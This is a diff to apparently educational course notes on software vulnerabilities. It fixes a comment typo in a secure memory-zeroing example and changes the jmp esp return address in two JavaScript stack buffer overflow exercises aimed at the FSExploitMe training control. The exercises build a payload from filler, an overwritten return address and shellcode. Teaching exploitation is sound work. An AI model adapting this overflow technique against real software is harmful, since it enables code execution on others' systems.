@@ -12,7 +12,7 @@ Brad Antoniewicz ([@brad_anton](https://twitter.com/brad_anton)) is currently a 
 
 ``` C
 memset(buffer, 0, sizeof(buffer)); 
-buffer[0] = 0;    // Prevent compiiler optimizing away memset by (meaninglessly) accessing it afterward
+buffer[0] = 0;    // Prevent compiler optimizing away memset by (meaninglessly) accessing it afterward
 ```
 
 or in Win32, using SecureZeroMemory ([https://msdn.microsoft.com/en-us/library/windows/desktop/aa366877(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366877(v=vs.85).aspx)) instead of ZeroMemory.
@@ -62,7 +62,7 @@ function L2Exercise1() {
 4. ```Javascript
 function L2Exercise1() {
   var s = MakeString(1028/2);
-  s += "\ub000\u5443"  /* jmp esp address */
+  s += "\u2437\u5443"  /* jmp esp address */
   s += shellcode;
   FSExploitMe.StackBuffer(s);
 }
@@ -71,12 +71,16 @@ function L2Exercise1() {
 6. ```Javascript
 function L2Exercise1() {
   var s = MakeString(1028/2);
-  s += "\ub000\u5443"  /* jmp esp address */
+  s += "\u2437\u5443"  /* jmp esp address */
   s += "\u4141\u4141"
   s += shellcode;
   FSExploitMe.StackBuffer(s);
 }
 ```
+
+Profit!
+
+
 ### Software Vulnerabilities and Common Exploits Lesson 2 - Wk 4
 
 Random note: While 0x41 is ASCII A, `\u4141` used in the exploit examples is 䅁, the unified Chinese/Japanese/Korean "Ideograph to husk rice; to get the grains by oppressing the ears of the rice plant" ([https://unicode-table.com/en/4141/](https://unicode-table.com/en/4141/)). Sort of apropos.
